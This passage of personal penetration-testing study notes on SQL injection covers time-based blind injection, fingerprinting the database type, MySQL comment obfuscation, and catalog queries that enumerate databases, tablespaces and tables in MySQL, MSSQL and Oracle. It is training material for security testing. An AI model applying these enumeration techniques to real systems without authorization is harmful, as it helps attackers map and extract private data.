+</code></pre><h3 id="4cede86d-2520-439a-b556-797ea04da524" class=""><strong>Time-based</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#time-based"></a></strong></h3><p id="7ece3a9d-2307-4ca6-a92c-5475c0935cc1" class="">The focus is on the delays of response</p><p id="c38430bc-54a9-4ad3-995a-a77736593772" class="">Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="387fe747-52c5-4d8b-98ee-d142c2e5dfda" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Is the first character of the username a &#x27;G&#x27;?
+- if yes = &#x27;waits 15 seconds&#x27; / if not = &#x27;answer imediately any message&#x27;
+</code></pre><h2 id="24b2cdfb-930e-457a-aac5-af26cc576928" class=""><strong>Gathering Information from the Environment</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#gathering-information-from-the-environment"></a></strong></h2><p id="51d4c514-3ff9-4ba0-a92c-f1627c3ed0ba" class="">Before exploiting we need to understand some basic fundamentals about our backend DBMS</p><p id="0b1a34e7-891b-4cea-87fb-dc00601f6f03" class="">Fingerprint techniques may vary under:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a70cfea2-b8fe-4659-bd97-cf61ab2898e7" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Non-Blind
+- Blind
+</code></pre><p id="a2ebd3ba-0316-43a2-a9ab-aec1f55133b7" class="">Our Goals:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8e5c3f07-b68c-4e6a-84a2-33a116d4ce66" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- DMBS version
+- Databases structure and Data
+- Database Users and their privileges
+</code></pre><h2 id="44f89c3f-95ae-45a0-8693-43e3a4a16630" class=""><strong>Identifying the DBMS</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#identifying-the-dbms"></a></strong></h2><h3 id="d47062ec-8044-4f5c-a06e-a90ae82acb34" class=""><strong>Error Code Analysis</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#error-code-analysis"></a></strong></h3><p id="5e6dd98a-0d13-4478-ab79-572af3db0eeb" class="">The most straightforward method consists of forcing the vuln app to return an error message. The more verbose the server errors are the better.</p><h3 id="81003dba-c485-4e32-957e-d651534d8aeb" class=""><strong>Banner Grabbing</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#banner-grabbing"></a></strong></h3><p id="df0009a8-8db8-4c79-a51e-aef0973e8691" class="">Sometimes, the error code analysis does not return any details, like the exact version and patch level; however, it does return the database name.</p><p id="0759fc66-4d3e-4bf9-9a00-df7fbc60a243" class="">The best way to identify the DBMS is by leveraging the NON-Blind scenario. Every DB implements specific functions that return the current version, so retrieving that value is straightforward.</p><ul id="fc565ef9-3d2b-4d9e-ac91-bf7c5064fd2e" class="bulleted-list"><li style="list-style-type:disc">example in images</li></ul><h3 id="6779e510-c9df-44a2-a0d8-d8755c4bdaea" class=""><strong>Educated Guessing</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#educated-guessing"></a></strong></h3><ul id="503fe426-d13d-4c0f-af42-bdcf3ac2b888" class="bulleted-list"><li style="list-style-type:disc">If we are facing a BLIND scenario, we can execute Educated Guessing of whats behind the injection point.</li></ul><h3 id="a4b30847-6008-4a15-bb76-5f4caef01ffa" class=""><strong>String Concatenation</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#string-concatenation"></a></strong></h3><ul id="409683a7-234b-4e3f-86cd-54d6e44cedb1" class="bulleted-list"><li style="list-style-type:disc">Each DBMS handles strings differently, making the way which String Concatenation is handled even more interesting.</li></ul><ul id="c0d45de6-39e9-4586-95df-c71cbbfdb41d" class="bulleted-list"><li style="list-style-type:disc">example in images</li></ul><h3 id="b894a529-9408-4b00-a0c2-71ba6a989d60" class=""><strong>Numeric Functions</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#numeric-functions"></a></strong></h3><p id="7b46b7e2-efaf-4725-8def-ee260cdc069f" class="">If the injection point is evaluated as a <strong>number</strong>, we can perform the same approach, but with numeric functions *example in images</p><h3 id="bc0be942-0086-484c-a0ee-e6147107be94" class=""><strong>SQL Dialect</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#sql-dialect"></a></strong></h3><p id="260e6789-ac1b-4330-9884-2950ab72d56e" class="">We can use Date and Time Functions (see NOW()+0 in MySQL) or specific Miscellaneous DBMS Functions (see UID in Oracle). And many more…</p><p id="3a0b4e12-897d-4623-99b0-e20541ab4614" class="">Another options, is how <strong>comments</strong> are handled.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="38139635-4210-43aa-b764-8e975d3519ef" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- MySQL: https://dev.mysql.com/doc/refman/8.0/en/comments.html
+</code></pre><p id="fdb65b74-a40d-4d5c-86ec-3b2de0d0b161" class="">MySQL provides a variant to C-Style comments:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5ad78c63-bd2c-405c-ab33-cbbfab7d2d33" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">/*! MySQL-specific code */
+</code></pre><p id="9476f527-0ed7-46a8-ae73-49b86b0cc96b" class="">This is helpful to do a good <strong>obfuscator</strong> technique.</p><p id="8a78c89d-8e84-4b74-8439-377acded2fa7" class="">Example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="29aff9f1-b7a8-4027-87ce-6d72bc30efa5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT 1 /*!50530 + 1 */  # executed only by server MySQL 5.5.30 or higher
+</code></pre><h3 id="8478d7f0-1c34-4c6f-8939-9d52df40dacf" class=""><strong>Enumerating the DBMS Content</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#enumerating-the-dbms-content"></a></strong></h3><p id="1c4cc2a0-52ab-4b38-a598-b0438a82b4b5" class="">The smartest way to begin is by enumerating in this order:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b4a01e3d-65fe-44e5-99fe-0f04ed4738bd" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Databases schemas
+- Tables
+- Columns
+- Users
+</code></pre><p id="13b2ed8c-95b1-4d1e-9ff9-0ee667187808" class="">This info is also known as <strong>metadata</strong>, <strong>system catalog</strong> or <strong>data dictionary</strong></p><h3 id="908191e3-c13b-44f6-b633-83e0d8c4e4be" class=""><strong>In MySQL</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#in-mysql"></a></strong></h3><p id="6376d7f3-3bfc-4fc3-b4bd-732a9a07c8de" class="">→ https://dev.mysql.com/doc/refman/8.0/en/information-schema.html</p><p id="59e0cf6b-be6d-462b-bb64-557bf265e0ca" class="">Information_schema is the magic place where we can retrieve all the metadata required.</p><p id="2f3540dd-815c-46d2-a887-d0a07de11957" class="">All the info about the other databases are stored within the table SCHEMATA.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5e4a8489-d040-4a80-a674-6b12dcf6a512" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT schema_name FROM information_schema.schemata;
+</code></pre><p id="c6fc4f24-2f1c-49aa-9984-41b063584345" class="">If the user running MySQL has SHOW privileges, then the previous command can be condensed into this:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3ba9d57a-034e-42a7-b71e-6e9f7c9f8327" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SHOW databases;
+SHOW schemas;
+</code></pre><p id="64c8ecb4-738d-42de-ac94-0fbb33b8b813" class="">MySQL provides a list of useful functions and operators</p><p id="eb7057af-2bf8-4260-b040-6bd11ea265b4" class="">→ https://dev.mysql.com/doc/refman/8.0/en/information-functions.html</p><p id="ce8c8106-dc03-4f3c-8c9a-997dfb7c21a4" class="">We can use:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9c7301a5-bd3d-4fb5-ab6d-b068dc561cf7" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT DATABASE();
+SELECT SCHEMA();
+</code></pre><h3 id="d4105acf-29c4-4f79-bb92-737393f3bbd9" class=""><strong>In MSSQL</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#in-mssql"></a></strong></h3><p id="3c3292de-9e3d-46da-b094-6be1e6e0fc91" class="">All the system-level information is stored within the System Tables:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bef2af0d-783a-4cd8-b32a-3c88b2c978fc" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">http://msdn.microsoft.com/en-us/library/ms179932.aspx
+</code></pre><p id="92f01aae-6a12-4463-b3a1-d9d438bab43f" class="">Depending on the version, these tables exists either only in the MASTER database or in every database</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="166dbba7-3856-4ac4-bede-1f54fadfd8eb" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">https://docs.microsoft.com/en-us/sql/relational-databases/databases/master-database?redirectedfrom=MSDN&amp;view=sql-server-ver15
+</code></pre><p id="27f37806-a010-44ba-9b20-fbb82e68b40d" class="">Info about the databases is stored in the system table: <strong>sysdatabases</strong></p><p id="11064e5f-6e1e-4241-80b6-dcdcc827a6bf" class="">query:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c086e8b2-ac68-40b6-aa23-420f11cd84f0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT name FROM master..sysdatabases;
+SELECT name FROM sysdatabases;
+</code></pre><p id="a719098d-5bed-4bb1-94fa-f0306638d96e" class="">The alternative is SYSTEM VIEWS → http://msdn.microsoft.com/en-us/library/ms177862.aspx</p><p id="91eae88a-683a-4cd2-b8a6-289df6f8750a" class="">The most interesting views:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a968f32e-07c9-44b6-b0a9-af29aa04d182" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- Compability: http://msdn.microsoft.com/en-us/library/ms187376.aspx
+- Information: http://msdn.microsoft.com/en-us/library/ms186778.aspx
+- Schema     : http://msdn.microsoft.com/en-us/library/ms186778.aspx
+</code></pre><p id="e036f75f-291c-495e-88f1-d58ea8e1b6e9" class="">For a mapping between System Tables and System Views:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c2184034-a1df-4df2-a265-ce529aec53a9" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">http://msdn.microsoft.com/en-us/library/ms187997.aspx
+</code></pre><p id="988fc14e-6dea-44a3-baa7-fcfc4a72e597" class="">We can also use <strong>Catalog</strong> view:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="905a0f20-f9f4-43ac-82e4-f8dc605ab316" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT name FROM SYS.databases;
+</code></pre><p id="59ff5a39-b83e-47b4-a898-12d36bbe7956" class="">We can leverage a utility function:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="285a89b2-f919-487d-bc97-59a8ecf18004" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT DB_NAME();
+</code></pre><p id="1da0de0e-246b-4321-98aa-463f73772b84" class="">Providing a smallint ID, so we can retrieve info about a specific database:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8db7b117-d454-43e1-9d6c-fe6352e9ab08" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT DB_NAME(1);
+</code></pre><p id="7a5f9276-7888-40f9-b864-27e3c872d09a" class="">A list of names and IDs:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="74287b7d-9306-42a6-bfaf-8496c56bd76e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT dbid, DB_NAME(dbid) from master..sysdatabases;
+</code></pre><h3 id="c3b58a72-b5ba-4d45-a10c-2cfcd6b0c010" class=""><strong>In Oracle</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#in-oracle"></a></strong></h3><p id="8b54d9d9-55de-4e1a-9247-4989d5e82792" class="">It does not have a simple model system like the previous two.</p><p id="dd3c961c-e2ac-4b99-be97-a7eab8c3b409" class="">Concepts to understand:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d29152e-c562-4f77-873c-b0d206a53e5e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Database: Where are stored the physical files
+Instance: The pool of processes, memory areas, etc. Useful to access data.
+</code></pre><p id="df3daec8-7cc1-491e-8093-537356f848fb" class="">Each DATABASE must point to an INSTANCE that has its custon logical and physical structures in order to store information like tables, indexes, etc.</p><p id="9e52ffa9-da04-4a21-9f1a-d5e6b0d839a1" class="">The most important structure: <strong>TABLESPACE</strong></p><p id="adee92c3-fea0-4579-927a-5cd6c9f8caf6" class="">List the TABLESPACE the current user can use:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ba213a19-42f2-489b-91d8-bbdb4bbafe57" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT TABLESPACE_NAME FROM USER_TABLESPACES
+</code></pre><p id="b8482980-3001-4616-b9ec-215e6dacdab7" class=""><strong>SYSTEM</strong> and <strong>SYSAUX</strong> are the system <strong>TABLESPACE</strong> created automatically at the beginning when the database is made.</p><p id="3d8c5072-69fb-4958-9ece-f93067b995ac" class="">If we want to retrieve the default <strong>TABLESPACE</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="989ffacc-0911-4700-b77f-35f9ee1622b0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT DEFAULT_TABLESPACE FROM USER_USERS
+SELECT DEFAULT_TABLESPACE FROM SYS.USER_USERS
+# The USER_USERS is the table in SYS that describes the current user
+</code></pre><h3 id="db06cbba-6a4f-42f2-bd7b-f60255dca850" class=""><strong>Tables &amp; Columns</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#tables--columns"></a></strong></h3><h3 id="f334f3e6-fcc3-411f-9b2e-74f946259209" class=""><strong>MySQL</strong><strong><a href="https://johnermac.github.io/notes/ewptx/sqli/#mysql"></a></strong></h3><p id="6deb6789-ddb5-40d3-a837-5ce9243f874b" class="">→ http://dev.mysql.com/doc/refman/5.0/en/tables-table.html</p><p id="71b0d96e-f6c2-4b7a-b371-09698b59e000" class=""><strong>INFORMATION_SCHEMA.TABLES</strong> is the table that provides information about tables in the databases managed.</p><p id="3ad9b667-6618-45ae-869a-710e9b62ef17" class="">We can run the following query:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d5ee85c-9a9b-4874-816a-1caed9ba89f1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
